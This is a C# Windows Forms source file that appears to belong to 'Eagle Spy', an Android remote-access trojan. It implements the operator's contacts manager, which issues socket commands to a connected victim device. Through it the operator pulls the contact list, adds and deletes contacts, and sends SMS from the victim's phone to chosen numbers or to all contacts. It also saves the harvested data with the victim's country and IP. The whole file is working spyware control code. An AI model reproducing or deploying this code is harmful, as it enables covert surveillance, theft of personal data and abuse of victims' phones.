using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Eagle_Spy.sockets;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class ContactsManager : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV0")]
	private DataGridView _DGV0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RefreshToolStripMenuItem")]
	private ToolStripMenuItem _RefreshToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("AddToolStripMenuItem")]
	private ToolStripMenuItem _AddToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DeleteToolStripMenuItem")]
	private ToolStripMenuItem _DeleteToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveToolStripMenuItem")]
	private ToolStripMenuItem _SaveToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveAsToolStripMenuItem")]
	private ToolStripMenuItem _SaveAsToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private System.Windows.Forms.Timer _TOpacity;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BoxTitle")]
	private PictureBox _BoxTitle;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SendSmsToolStripMenuItem")]
	private ToolStripMenuItem _SendSmsToolStripMenuItem;

	public TcpClient Client;

	public Client classClient;

	public string Title;

	public string tmpFolderUSER;

	public string tmpClientName;

	public string tmpCountry;

	public string tmpAddressIP;

	private bool BoxTitlePaintEventArgsWait;

	internal DataGridView DGV0
	;

	[field: AccessedThroughProperty("ctxMenu")]
	internal ContextMenuStrip ctxMenu
	;
	internal ToolStripMenuItem RefreshToolStripMenuItem
	;

	internal ToolStripMenuItem AddToolStripMenuItem
;

	internal ToolStripMenuItem DeleteToolStripMenuItem
	;

	internal ToolStripMenuItem SaveToolStripMenuItem
	;

	internal ToolStripMenuItem SaveAsToolStripMenuItem
;

	internal System.Windows.Forms.Timer TOpacity
	;

	[field: AccessedThroughProperty("PB")]
	internal ProgressBar PB
    ;

	internal PictureBox BoxTitle
	;
	[field: AccessedThroughProperty("Column1")]
	internal DataGridViewTextBoxColumn Column1
;

    [field: AccessedThroughProperty("Column6")]
	internal DataGridViewTextBoxColumn Column6
	;

	[field: AccessedThroughProperty("Column9")]
	internal DataGridViewTextBoxColumn Column9
    ;

    [field: AccessedThroughProperty("Column2")]
	internal DataGridViewImageColumn Column2
    ;

	internal ToolStripMenuItem SendSmsToolStripMenuItem
	;
	public ContactsManager()
	{
		base.Load += ContactsManager_Load;
		base.Activated += AngelAndroidForm_Activated;
		base.Deactivate += AngelAndroidForm_Deactivate;
		Title = "null";
		BoxTitlePaintEventArgsWait = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
            this.components = new System.ComponentModel.Container();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle10 = new System.Windows.Forms.DataGridViewCellStyle();
            this.DGV0 = new System.Windows.Forms.DataGridView();
            this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column9 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column2 = new System.Windows.Forms.DataGridViewImageColumn();
            this.ctxMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.RefreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SendSmsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.AddToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.DeleteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SaveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SaveAsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.TOpacity = new System.Windows.Forms.Timer(this.components);
            this.PB = new System.Windows.Forms.ProgressBar();
            this.BoxTitle = new System.Windows.Forms.PictureBox();
            ((System.ComponentModel.ISupportInitialize)(this.DGV0)).BeginInit();
            this.ctxMenu.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.BoxTitle)).BeginInit();
            this.SuspendLayout();
            // 
            // DGV0
            // 
            this.DGV0.AllowUserToAddRows = false;
            this.DGV0.AllowUserToDeleteRows = false;
            this.DGV0.AllowUserToResizeColumns = false;
            this.DGV0.AllowUserToResizeRows = false;
            dataGridViewCellStyle6.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle6.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.Red;
            dataGridViewCellStyle6.SelectionForeColor = System.Drawing.Color.White;
            this.DGV0.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle6;
            this.DGV0.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
            this.DGV0.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.DGV0.BackgroundColor = System.Drawing.Color.Black;
            this.DGV0.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.DGV0.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
            this.DGV0.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            dataGridViewCellStyle7.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle7.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle7.Font = new System.Drawing.Font("Calibri", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle7.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle7.SelectionBackColor = System.Drawing.Color.Red;
            dataGridViewCellStyle7.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle7.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DGV0.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle7;
            this.DGV0.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.DGV0.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.Column1,
            this.Column6,
            this.Column9,
            this.Column2});
            this.DGV0.ContextMenuStrip = this.ctxMenu;
            dataGridViewCellStyle8.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle8.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle8.Font = new System.Drawing.Font("Calibri", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle8.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle8.SelectionBackColor = System.Drawing.Color.Red;
            dataGridViewCellStyle8.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle8.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.DGV0.DefaultCellStyle = dataGridViewCellStyle8;
            this.DGV0.Dock = System.Windows.Forms.DockStyle.Fill;
            this.DGV0.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.DGV0.EnableHeadersVisualStyles = false;
            this.DGV0.GridColor = System.Drawing.Color.Red;
            this.DGV0.Location = new System.Drawing.Point(0, 0);
            this.DGV0.Name = "DGV0";
            this.DGV0.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle9.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle9.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle9.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle9.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle9.SelectionBackColor = System.Drawing.Color.Red;
            dataGridViewCellStyle9.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle9.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DGV0.RowHeadersDefaultCellStyle = dataGridViewCellStyle9;
            this.DGV0.RowHeadersVisible = false;
            dataGridViewCellStyle10.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle10.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle10.SelectionBackColor = System.Drawing.Color.Red;
            dataGridViewCellStyle10.SelectionForeColor = System.Drawing.Color.White;
            this.DGV0.RowsDefaultCellStyle = dataGridViewCellStyle10;
            this.DGV0.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.DGV0.Size = new System.Drawing.Size(589, 425);
            this.DGV0.TabIndex = 3;
            this.DGV0.RowsAdded += new System.Windows.Forms.DataGridViewRowsAddedEventHandler(this.DGV0_RowsAdded);
            this.DGV0.RowsRemoved += new System.Windows.Forms.DataGridViewRowsRemovedEventHandler(this.DGV0_RowsRemoved);
            this.DGV0.SelectionChanged += new System.EventHandler(this.DGV0_SelectionChanged);
            // 
            // Column1
            // 
            this.Column1.HeaderText = "name";
            this.Column1.Name = "Column1";
            this.Column1.Width = 56;
            // 
            // Column6
            // 
            this.Column6.HeaderText = "number";
            this.Column6.Name = "Column6";
            this.Column6.Width = 67;
            // 
            // Column9
            // 
            this.Column9.HeaderText = "connected-via";
            this.Column9.Name = "Column9";
            this.Column9.Width = 96;
            // 
            // Column2
            // 
            this.Column2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
            this.Column2.FillWeight = 1F;
            this.Column2.HeaderText = "";
            this.Column2.MinimumWidth = 2;
            this.Column2.Name = "Column2";
            this.Column2.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.Programmatic;
            this.Column2.Width = 2;
            // 
            // ctxMenu
            // 
            this.ctxMenu.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.ctxMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.RefreshToolStripMenuItem,
            this.SendSmsToolStripMenuItem,
            this.AddToolStripMenuItem,
            this.DeleteToolStripMenuItem,
            this.SaveToolStripMenuItem,
            this.SaveAsToolStripMenuItem});
            this.ctxMenu.Name = "ctxMenu";
            this.ctxMenu.ShowImageMargin = false;
            this.ctxMenu.Size = new System.Drawing.Size(100, 136);
            // 
            // RefreshToolStripMenuItem
            // 
            this.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem";
            this.RefreshToolStripMenuItem.Size = new System.Drawing.Size(99, 22);
            this.RefreshToolStripMenuItem.Text = "Refresh";
            this.RefreshToolStripMenuItem.Click += new System.EventHandler(this.RefreshToolStripMenuItem_Click);
            // 
            // SendSmsToolStripMenuItem
            // 
            this.SendSmsToolStripMenuItem.Name = "SendSmsToolStripMenuItem";
            this.SendSmsToolStripMenuItem.Size = new System.Drawing.Size(99, 22);
            this.SendSmsToolStripMenuItem.Text = "Send sms";
            this.SendSmsToolStripMenuItem.Click += new System.EventHandler(this.SendSmsToolStripMenuItem_Click);
            // 
            // AddToolStripMenuItem
            // 
            this.AddToolStripMenuItem.Name = "AddToolStripMenuItem";
            this.AddToolStripMenuItem.Size = new System.Drawing.Size(99, 22);
            this.AddToolStripMenuItem.Text = "Add";
            this.AddToolStripMenuItem.Click += new System.EventHandler(this.AddToolStripMenuItem_Click);
            // 
            // DeleteToolStripMenuItem
            // 
            this.DeleteToolStripMenuItem.Name = "DeleteToolStripMenuItem";
            this.DeleteToolStripMenuItem.Size = new System.Drawing.Size(99, 22);
            this.DeleteToolStripMenuItem.Text = "Delete";
            this.DeleteToolStripMenuItem.Click += new System.EventHandler(this.DeleteToolStripMenuItem_Click);
            // 
            // SaveToolStripMenuItem
            // 
            this.SaveToolStripMenuItem.Name = "SaveToolStripMenuItem";
            this.SaveToolStripMenuItem.Size = new System.Drawing.Size(99, 22);
            this.SaveToolStripMenuItem.Text = "Save";
            this.SaveToolStripMenuItem.Visible = false;
            this.SaveToolStripMenuItem.Click += new System.EventHandler(this.SaveToolStripMenuItem_Click);
            // 
            // SaveAsToolStripMenuItem
            // 
            this.SaveAsToolStripMenuItem.Name = "SaveAsToolStripMenuItem";
            this.SaveAsToolStripMenuItem.Size = new System.Drawing.Size(99, 22);
            this.SaveAsToolStripMenuItem.Text = "Save As";
            this.SaveAsToolStripMenuItem.Visible = false;
            this.SaveAsToolStripMenuItem.Click += new System.EventHandler(this.SaveAsToolStripMenuItem_Click);
            // 
            // TOpacity
            // 
            this.TOpacity.Interval = 1;
            this.TOpacity.Tick += new System.EventHandler(this.TOpacity_Tick);
            // 
            // PB
            // 
            this.PB.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.PB.Location = new System.Drawing.Point(0, 425);
            this.PB.Name = "PB";
            this.PB.Size = new System.Drawing.Size(589, 10);
            this.PB.TabIndex = 6;
            // 
            // BoxTitle
            // 
            this.BoxTitle.BackColor = System.Drawing.Color.Red;
            this.BoxTitle.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.BoxTitle.ErrorImage = null;
            this.BoxTitle.InitialImage = null;
            this.BoxTitle.Location = new System.Drawing.Point(0, 435);
            this.BoxTitle.Name = "BoxTitle";
            this.BoxTitle.Size = new System.Drawing.Size(589, 18);
            this.BoxTitle.TabIndex = 7;
            this.BoxTitle.TabStop = false;
            this.BoxTitle.Paint += new System.Windows.Forms.PaintEventHandler(this.BoxTitle_Paint);
            this.BoxTitle.Resize += new System.EventHandler(this.BoxTitle_Resize);
            // 
            // ContactsManager
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(589, 453);
            this.Controls.Add(this.DGV0);
            this.Controls.Add(this.PB);
            this.Controls.Add(this.BoxTitle);
            this.Name = "ContactsManager";
            this.Opacity = 0D;
            this.ShowIcon = false;
            this.Text = "ContactsManager";
            ((System.ComponentModel.ISupportInitialize)(this.DGV0)).EndInit();
            this.ctxMenu.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.BoxTitle)).EndInit();
            this.ResumeLayout(false);

	}

	public void translateme()
	{
		string language = RegistryHandler.Get_Language();
		checked
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
			{
				if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
				{
					int num = ctxMenu.Items.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						ctxMenu.Items[i].Text = Codes.Translate(ctxMenu.Items[i].Text, "en", "zh");
					}
				}
			}
			else
			{
				int num2 = ctxMenu.Items.Count - 1;
				for (int j = 0; j <= num2; j++)
				{
					ctxMenu.Items[j].Text = Codes.Translate(ctxMenu.Items[j].Text, "en", "ar");
				}
			}
		}
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
			base.Opacity += 0.1;
		else
			TOpacity.Enabled = false;
	}

	private void ContactsManager_Load(object sender, EventArgs e)
	{
		translateme();
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\3.ico");
		DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
		DGV0.DefaultCellStyle.Font = reso.f;
		if (Operators.CompareString(SpySettings.SAVING_DATA, "No", TextCompare: false) == 0)
		{
			SaveToolStripMenuItem.Visible = true;
			SaveAsToolStripMenuItem.Visible = true;
		}
		Text = Title;
		TOpacity.Interval = SpySettings.T_Interval;
		TOpacity.Enabled = true;
		BoxTitlePaintEventArgsWait = true;
	}

	private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
	{
		reso.Directory_Exist(classClient);
		ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
		{
			reso.SAVEit((Array)a0);
		}, new object[8]
		{
			DGV0,
			tmpFolderUSER,
			"Contacts Manager",
			tmpClientName,
			tmpCountry + " - " + tmpAddressIP,
			"Contacts",
			"log",
			DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
		});
	}

	private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
		saveFileDialog.Filter = "html (*.html)|*.html";
		if (saveFileDialog.ShowDialog() == DialogResult.OK)
			ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
			{
				reso.SAVEit((Array)a0);
			}, new object[8]
			{
				DGV0,
				"null",
				saveFileDialog.FileName,
				tmpClientName,
				tmpCountry + " - " + tmpAddressIP,
				"Contacts",
				"log",
				"null"
			});
		saveFileDialog.Dispose();
	}

	private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
			return;
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				string text = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Tag);
				string text2 = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value);
				if (classClient != null)
				{
					object[] parametersObjects = new object[4]
					{
						Client,
						SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".contacts" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "del" + Data.SPL_DATA + text + Data.SPL_DATA + text2,
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects);
					DGV0.Rows.RemoveAt(DGV0.SelectedRows[i].Index);
				}
			}
		}
	}

	private void AddToolStripMenuItem_Click(object sender, EventArgs e)
	{
		AddNumber addNumber = new AddNumber();
		addNumber.Text = "Add new contact";
		addNumber.L0.Text = "Enter Name";
		addNumber.L1.Text = "Enter Number";
		addNumber.StartPosition = FormStartPosition.Manual;
		addNumber.Location = Codes.FixSize(this, addNumber);
		DialogResult dialogResult = addNumber.ShowDialog(this);
		if (dialogResult == DialogResult.OK && classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".contacts" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "add" + Data.SPL_DATA + addNumber.InputText0.Text + Data.SPL_DATA + addNumber.InputText1.Text,
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
		addNumber.Close();
	}

	private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".contacts" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getContacts + Data.SPL_SOCKET + "contacts",
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
	}

	private void BoxTitle_Paint(object sender, PaintEventArgs e)
	{
		checked
		{
			if (BoxTitlePaintEventArgsWait)
			{
				int count = DGV0.Rows.Count;
				string text = "All " + Conversions.ToString(count);
				string text2 = "Selected " + Conversions.ToString(DGV0.SelectedRows.Count);
				Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
				e.Graphics.DrawLine(new Pen(Color.FromArgb(50, defaultColor_Foreground.R, defaultColor_Foreground.G, defaultColor_Foreground.B)), 0, 1, BoxTitle.Width, 1);
				Brush brush = new SolidBrush(SpySettings.DefaultColor_Foreground);
				Brush brush2 = new SolidBrush(Color.FromArgb(170, BoxTitle.BackColor.R, BoxTitle.BackColor.G, BoxTitle.BackColor.B));
				Size size = TextRenderer.MeasureText(text + Strings.Space(10) + text2, reso.f);
				Rectangle rect = new Rectangle(0, 2, BoxTitle.Width, size.Height + 5);
				e.Graphics.FillRectangle(new Pen(brush2).Brush, rect);
				e.Graphics.DrawString(text + Strings.Space(10) + text2 + Strings.Space(10), reso.f, brush, 0f, 2f);
				Size size2 = TextRenderer.MeasureText("S", reso.f);
				if (BoxTitle.Height != size2.Height + 3)
					BoxTitle.Height = size2.Height + 3;
			}
		}
	}

	private void AngelAndroidForm_Activated(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void AngelAndroidForm_Deactivate(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void BoxTitle_Resize(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void SendSmsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				if (DGV0.SelectedRows.Count <= 0 || classClient == null)
					return;
				smsMaker smsMaker2 = new smsMaker();
				int num = DGV0.SelectedRows.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					string item = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value);
					smsMaker2.numslist.Items.Add(item);
				}
				if (smsMaker2.ShowDialog() != DialogResult.OK || smsMaker2.numslist.Items.Count <= 0)
					return;
				string text = smsMaker2.msgtext.Text;
				TcpClient myClient = classClient.myClient;
				string[] array = classClient.Keys.Split(':');
				int num2 = 0;
				int num3 = 0;
				if (smsMaker2.checkall.Checked)
				{
					object[] parametersObjects = new object[4]
					{
						myClient,
						SecurityKey.KeysClient2 + Data.SPL_SOCKET + "ssms<*>all<>" + text + "#" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Conversions.ToString(num3) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects);
				}
				else
				{
					int num4 = smsMaker2.numslist.Items.Count - 1;
					for (int j = 0; j <= num4; j++)
					{
						string text2 = Conversions.ToString(smsMaker2.numslist.Items[j]);
						if (!(string.IsNullOrEmpty(text2) | string.IsNullOrWhiteSpace(text2)))
						{
							object[] parametersObjects2 = new object[4]
							{
								myClient,
								SecurityKey.KeysClient2 + Data.SPL_SOCKET + "ssms<*>" + text2 + "#" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Conversions.ToString(num3) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
								Codes.Encoding().GetBytes("null"),
								classClient
							};
							classClient.SendMessage(parametersObjects2);
						}
					}
				}
				CraxsAlert.ShowSucess("your message was sent successfully");
			}
			catch (Exception)
			{
				//ProjectData.SetProjectError(projectError);
				//////CraxsAlert.Showinformation("Sorry");
			}
		}
	}

	private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void DGV0_SelectionChanged(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}
}
